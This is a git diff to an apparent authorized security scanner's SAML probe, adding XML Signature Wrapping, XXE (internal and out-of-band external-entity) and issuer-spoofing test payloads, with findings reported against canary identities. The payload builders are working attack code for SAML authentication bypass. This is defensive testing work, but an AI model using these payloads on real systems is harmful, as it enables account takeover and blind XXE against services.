@@ -5,10 +5,21 @@
 // sits behind a differential oracle per the 100% truth rule. The probe NEVER
 // forges a real IdP session, never touches a live IdP, never follows
 // redirects: ACS POSTs only, per-run canary NameIDs, tamper-and-observe.
-// v1 honest limits (documented in docs/scanner/saml.md): T2 XML Signature
-// Wrapping needs real XML-DSig (C14N) — pending; T3 XXE-OOB needs a listener.
+// Advanced coverage (documented in docs/scanner/saml-advanced.md):
+// - XSW (T2, #67/#441): genuine reference-binding test — we mint OUR OWN RSA
+//   keypair, sign a decoy assertion's exact bytes (near-canonical form so the
+//   digest matches what an inclusive-C14N validator hashes), and check whether
+//   the SP validates that signature yet consumes a DIFFERENT unsigned
+//   assertion. We never claim to forge the real IdP's key — the bug class is
+//   reference-binding/trust-confusion, which this detects.
+// - XXE (T3, #443): internal entity expansion probe; the OOB external-entity
+//   variant needs a collaborator callback (opts.oobCallback) AND a lab-gated
+//   host — otherwise it is skipped and the limit is documented.
+// - Issuer confusion (#445): metadata integrity check + unsigned issuer-string
+//   trust differential.
 
 import zlib from 'node:zlib';
+import crypto from 'node:crypto';
 
 const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
 
@@ -82,6 +93,138 @@ export function buildSamlResponse({ nameId, audience, notOnOrAfter, issuer }) {
   return zlib.deflateRawSync(Buffer.from(xml, 'utf8')).toString('base64');
 }
 
+function deflateB64(xml) {
+  return zlib.deflateRawSync(Buffer.from(xml, 'utf8')).toString('base64');
+}
+
+// LAB GATE: aggressive variants run only when the authorized host is listed
+// in opts.labTargets (same split pattern as index.js).
+function isLabHost(url, opts) {
+  let host = '';
+  try { host = new URL(url).host; } catch { return false; }
+  return String(opts.labTargets || '')
+    .split(/[,\s]+/)
+    .some((t) => t && (host.includes(t) || t.includes(host)));
+}
+
+// ---- XSW helpers (#67/#441) ----
+// Honest design note: we cannot know the real IdP's signing key, so this test
+// never claims to forge an IdP signature. We mint OUR OWN throwaway RSA
+// keypair per run, sign assertion-1's exact bytes with it, and check whether
+// the SP (a) cryptographically validates a signature at all while (b) granting
+// a session for a DIFFERENT, unsigned assertion in the same Response. That
+// reference-binding / trust-confusion gap IS the XSW bug class
+// (duplicate-assertion and ID-confusion wrapping).
+
+// Assertion in near-canonical form: attributes lexicographically sorted,
+// empty elements self-closed, namespaces declared on the apex, zero
+// whitespace text nodes — so our byte digest matches what an inclusive-C14N
+// validator hashes over the same node.
+function canonicalAssertionXml({ id, nameId, issuer, audience }) {
+  const now = new Date().toISOString();
+  const nb = new Date(Date.now() - 5 * 60 * 1000).toISOString();
+  const noa = new Date(Date.now() + 5 * 60 * 1000).toISOString();
+  return (
+    `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ` +
+    `xmlns:ds="http://www.w3.org/2000/09/xmldsig#" ` +
+    `ID="${id}" IssueInstant="${now}" Version="2.0">` +
+    `<saml:Issuer>${issuer}</saml:Issuer>` +
+    `<saml:Subject>` +
+    `<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">${nameId}</saml:NameID>` +
+    `<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"/>` +
+    `</saml:Subject>` +
+    `<saml:Conditions NotBefore="${nb}" NotOnOrAfter="${noa}">` +
+    `<saml:AudienceRestriction><saml:Audience>${audience}</saml:Audience></saml:AudienceRestriction>` +
+    `</saml:Conditions>` +
+    `<saml:AuthnStatement AuthnInstant="${now}"/>` +
+    `</saml:Assertion>`
+  );
+}
+
+// Build a wrapped Response: assertion-1 (dummy identity) carries an enveloped
+// RSA-SHA256 signature whose Reference URI points at assertion-1's own ID;
+// assertion-2 (OUR canary identity) is completely UNSIGNED. signedFirst=false
+// (signed decoy LAST) catches last-assertion consumers; signedFirst=true
+// catches first-assertion consumers. In both orders the signature's Reference
+// URI points at a DIFFERENT assertion than the one carrying the canary — the
+// ID-confusion variant. Returns {xml, publicKeyPem} for test verification.
+export function buildXswResponse({ canary, issuer, audience, signedFirst = false }) {
+  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
+  const dummy = `dummy-user-${rand()}`;
+  const a1id = `_${rand()}${Date.now().toString(36)}a1`;
+  const a2id = `_${rand()}${Date.now().toString(36)}a2`;
+  const a1body = canonicalAssertionXml({ id: a1id, nameId: dummy, issuer, audience });
+  const digest = crypto.createHash('sha256').update(a1body, 'utf8').digest('base64');
+  const signedInfo =
+    `<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">` +
+    `<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>` +
+    `<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>` +
+    `<ds:Reference URI="#${a1id}">` +
+    `<ds:Transforms>` +
+    `<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>` +
+    `<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>` +
+    `</ds:Transforms>` +
+    `<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>` +
+    `<ds:DigestValue>${digest}</ds:DigestValue>` +
+    `</ds:Reference></ds:SignedInfo>`;
+  const sigVal = crypto.sign('sha256', Buffer.from(signedInfo, 'utf8'), privateKey).toString('base64');
+  const signatureXml =
+    `<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">${signedInfo}` +
+    `<ds:SignatureValue>${sigVal}</ds:SignatureValue>` +
+    `<ds:KeyInfo><ds:KeyName>dm-probe-key</ds:KeyName></ds:KeyInfo></ds:Signature>`;
+  // Enveloped: the digest covers assertion-1 WITHOUT the signature, so the
+  // signature is inserted after Issuer without disturbing the digest.
+  const a1signed = a1body.replace(/(<saml:Issuer>[^<]*<\/saml:Issuer>)/, `$1${signatureXml}`);
+  const a2 = canonicalAssertionXml({ id: a2id, nameId: canary, issuer, audience });
+  const now = new Date().toISOString();
+  const respId = `_${rand()}${Date.now().toString(36)}r`;
+  const assertions = signedFirst ? a1signed + a2 : a2 + a1signed;
+  const xml =
+    `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ` +
+    `xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ` +
+    `ID="${respId}" IssueInstant="${now}" Version="2.0">` +
+    `<saml:Issuer>${issuer}</saml:Issuer>` +
+    `<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>` +
+    assertions + `</samlp:Response>`;
+  return {
+    xml,
+    publicKeyPem: publicKey.export({ type: 'spki', format: 'pem' }),
+    signedAssertionId: a1id,
+    canaryAssertionId: a2id,
+  };
+}
+
+// ---- XXE helper (#443) ----
+// Unsigned SAMLResponse carrying a DOCTYPE. Internal-entity variant defines
+// <!ENTITY name "value"> and references it in NameID; the external variant
+// points a parameter entity at a canary URL (OOB, lab-gated). Never targets
+// real files — canary URLs only.
+export function buildXxeSamlResponse({ nameId, audience, issuer, entityName, entityValue, externalUrl }) {
+  const id = `_${rand()}${Date.now().toString(36)}`;
+  const nowD = new Date();
+  const now = nowD.toISOString();
+  const noa = new Date(nowD.getTime() + 5 * 60 * 1000).toISOString();
+  const doctype = externalUrl
+    ? `<!DOCTYPE samlp:Response [<!ENTITY % dmxxe SYSTEM "${externalUrl}"> %dmxxe;]>`
+    : `<!DOCTYPE samlp:Response [<!ENTITY ${entityName} "${entityValue}">]>`;
+  const xml = doctype +
+    `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ` +
+    `xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="${id}" Version="2.0" ` +
+    `IssueInstant="${now}">` +
+    `<saml:Issuer>${issuer || 'https://dm-probe.invalid/idp'}</saml:Issuer>` +
+    `<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>` +
+    `<saml:Assertion ID="${id}-a" Version="2.0" IssueInstant="${now}">` +
+    `<saml:Issuer>${issuer || 'https://dm-probe.invalid/idp'}</saml:Issuer>` +
+    `<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">${nameId}</saml:NameID>` +
+    `<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"/></saml:Subject>` +
+    `<saml:Conditions NotBefore="${new Date(nowD.getTime() - 5 * 60 * 1000).toISOString()}" NotOnOrAfter="${noa}">` +
+    `<saml:AudienceRestriction><saml:Audience>${audience}</saml:Audience></saml:AudienceRestriction>` +
+    `</saml:Conditions>` +
+    `<saml:AuthnStatement AuthnInstant="${now}"/>` +
+    `</saml:Assertion></samlp:Response>`;
+  return xml;
+}
+
 // POST a SAMLResponse to the ACS without following redirects.
 // Returns {status, setCookie, location, body}.
 export async function postSamlResponse(acsUrl, samlResponse, opts = {}) {
@@ -141,7 +284,8 @@ export async function discoverSamlMetadata(baseUrl, opts = {}) {
       const xml = await res.text();
       const m = xml.match(/AssertionConsumerService[^>]*Location="([^"]+)"/i);
       const e = xml.match(/entityID="([^"]+)"/i);
-      if (m) return { acsUrl: m[1], entityId: e ? e[1] : null, metadataUrl: origin + p };
+      const v = xml.match(/validUntil="([^"]+)"/i);
+      if (m) return { acsUrl: m[1], entityId: e ? e[1] : null, metadataUrl: origin + p, validUntil: v ? v[1] : null };
     } catch { /* try next */ } finally {
       clearTimeout(timer);
     }
@@ -191,6 +335,26 @@ export async function probeSaml(url, opts = {}) {
         'Attackers enumerate the ACS for targeted assertion attacks'
       ),
     });
+    // ---- #445a: metadata integrity — spoofable if served over HTTP or
+    // unbounded (no validUntil). Unsigned metadata is the norm in the wild,
+    // but http/unbounded metadata is trivially spoofable by a MITM.
+    const servedHttp = (meta.metadataUrl || '').startsWith('http://');
+    const noValidUntil = !meta.validUntil;
+    if (servedHttp || noValidUntil) {
+      findings.push({
+        class: 'saml_metadata_unsigned',
+        id: `saml-metasec-${rand()}`,
+        title: 'SAML metadata served without integrity guarantees — spoofable',
+        severity: 'low',
+        url: meta.metadataUrl,
+        parameter: 'EntityDescriptor',
+        evidence: evidenceBase(
+          `metadata ${servedHttp ? 'served over plain HTTP' : 'served over HTTPS'}` +
+          `${noValidUntil ? '; no validUntil attribute (unbounded trust)' : `; validUntil=${meta.validUntil}`}`,
+          'A MITM can substitute a spoofed IdP/SP descriptor — metadata should be https + validUntil-bounded'
+        ),
+      });
+    }
   }
 
   // ---- Find a live ACS endpoint ----
@@ -275,6 +439,128 @@ export async function probeSaml(url, opts = {}) {
           evidence: evidenceBase(
             'assertion for audience https://evil.example/ → session granted',
             'Assertions minted for other apps are accepted here'
+          ),
+        });
+      }
+    }
+
+    // ---- XSW (#67/#441, CRITICAL differential): only meaningful when T1's
+    // unsigned assertion was REJECTED — if unsigned is accepted, wrapping is
+    // moot and is skipped (nothing to wrap around).
+    if (!unsignedAccepted) {
+      const xswCanary = `DarkMatterProbe-xsw-${rand()}`;
+      // Control: fresh single unsigned assertion for the XSW canary — expect
+      // reject (re-proves the T1 verdict on the same identity we will wrap).
+      const srCtl = buildSamlResponse({ nameId: xswCanary, audience });
+      const rCtl = await postSamlResponse(acsUrl, srCtl, { timeoutMs });
+      if (!sessionGranted(rCtl, xswCanary)) {
+        // Attack: 2 POSTs — signed decoy last (catches last-assertion
+        // consumers) and signed decoy first (catches first-assertion
+        // consumers). In both, the signature's Reference URI binds
+        // assertion-1 (dummy) while the canary rides in the OTHER, unsigned
+        // assertion — the ID-confusion variant.
+        for (const signedFirst of [false, true]) {
+          const wrapped = buildXswResponse({
+            canary: xswCanary,
+            issuer: 'https://dm-probe.invalid/idp',
+            audience,
+            signedFirst,
+          });
+          const r = await postSamlResponse(acsUrl, deflateB64(wrapped.xml), { timeoutMs });
+          if (sessionGranted(r, xswCanary)) {
+            findings.push({
+              class: 'saml_xsw',
+              id: `saml-xsw-${rand()}`,
+              title: 'SAML XML Signature Wrapping — signed assertion validated, unsigned assertion consumed',
+              severity: 'critical',
+              url: acsUrl,
+              parameter: 'SAMLResponse',
+              evidence: evidenceBase(
+                `control: single unsigned assertion for ${xswCanary} → rejected (${rCtl.status}); ` +
+                `attack: Response with OUR-RSA-signed dummy assertion (Reference URI → its own ID) + unsigned ` +
+                `canary assertion (signed-${signedFirst ? 'first' : 'last'} order) → session granted for the ` +
+                `UNSIGNED CANARY ${xswCanary} (${r.status}, cookie=${r.setCookie.slice(0, 80)})`,
+                'Attacker wraps any captured signed assertion around an arbitrary unsigned identity — account takeover without the IdP key'
+              ),
+            });
+            break;
+          }
+        }
+      }
+    }
+
+    // ---- #445b: issuer-confusion differential — unsigned assertions are
+    // rejected, but does the SP trust the Issuer STRING without a signature?
+    // POST two unsigned assertions: one carrying the SP's own entityID from
+    // metadata (spoofed "trusted" issuer), one with a random issuer.
+    if (!unsignedAccepted && meta?.entityId) {
+      const issCanary = `DarkMatterProbe-iss-${rand()}`;
+      const srTrusted = buildSamlResponse({ nameId: issCanary, audience, issuer: meta.entityId });
+      const srRandom = buildSamlResponse({ nameId: issCanary, audience, issuer: `https://evil.invalid/${rand()}` });
+      const rT = await postSamlResponse(acsUrl, srTrusted, { timeoutMs });
+      const rR = await postSamlResponse(acsUrl, srRandom, { timeoutMs });
+      if (sessionGranted(rT, issCanary) && !sessionGranted(rR, issCanary)) {
+        findings.push({
+          class: 'saml_issuer_spoof',
+          id: `saml-isspo-${rand()}`,
+          title: 'SAML issuer string trusted without signature — issuer-confusion authentication bypass',
+          severity: 'high',
+          url: acsUrl,
+          parameter: 'Issuer',
+          evidence: evidenceBase(
+            `unsigned assertion with Issuer=${meta.entityId} (spoofed trusted issuer) → session granted for ` +
+            `${issCanary} (${rT.status}); unsigned assertion with random issuer → rejected (${rR.status})`,
+            'Anyone can mint unsigned assertions carrying the trusted issuer string — full account takeover'
+          ),
+        });
+      }
+    }
+
+    // ---- XXE in SAML parsing (#443) ----
+    // (a) Internal entity expansion: benign DOCTYPE, entity referenced in
+    // NameID. If the response/error reflects the EXPANDED value, the parser
+    // processes entities → XXE-capable parser.
+    {
+      const xxeVal = `DMXXE-${rand()}`;
+      const xxeXml = buildXxeSamlResponse({
+        nameId: '&dmxxe;', audience, entityName: 'dmxxe', entityValue: xxeVal,
+      });
+      const rX = await postSamlResponse(acsUrl, deflateB64(xxeXml), { timeoutMs });
+      if ((rX.body || '').includes(xxeVal)) {
+        findings.push({
+          class: 'saml_xxe_entities',
+          id: `saml-xxe-${rand()}`,
+          title: 'SAML parser resolves XML entities (XXE) — internal entity expansion observed',
+          severity: 'info',
+          url: acsUrl,
+          parameter: 'SAMLResponse',
+          evidence: evidenceBase(
+            `unsigned assertion with <!ENTITY dmxxe "${xxeVal}"> referenced as &dmxxe; in NameID → response ` +
+            `reflected the EXPANDED value`,
+            'Entity-processing parser on the auth endpoint: gateway to external-entity / file-disclosure XXE'
+          ),
+        });
+      }
+      // (b) OOB external-entity variant: only when an OOB callback base is
+      // available (opts.oobCallback) AND the host is lab-gated. Never
+      // exfiltrates real files — the entity target is a canary URL only.
+      // xxe.js has no collaborator infra today, so in practice this stays
+      // skipped and the limit is documented in docs/scanner/saml-advanced.md.
+      if (opts.oobCallback && isLabHost(url, opts)) {
+        const oobUrl = `${String(opts.oobCallback).replace(/\/+$/, '')}/saml-xxe-${rand()}`;
+        const xxeOobXml = buildXxeSamlResponse({ nameId: 'oob-probe', audience, externalUrl: oobUrl });
+        await postSamlResponse(acsUrl, deflateB64(xxeOobXml), { timeoutMs });
+        findings.push({
+          class: 'saml_xxe_oob_sent',
+          id: `saml-xxeoob-${rand()}`,
+          title: 'SAML XXE OOB probe dispatched (external parameter entity) — confirm via collaborator',
+          severity: 'info',
+          url: acsUrl,
+          parameter: 'SAMLResponse',
+          evidence: evidenceBase(
+            `external parameter entity → ${oobUrl} sent (canary URL only, no file targets); ` +
+            `confirm out-of-band via the collaborator`,
+            'An OOB hit proves external-entity resolution (blind XXE) on the ACS'
           ),
         });
       }
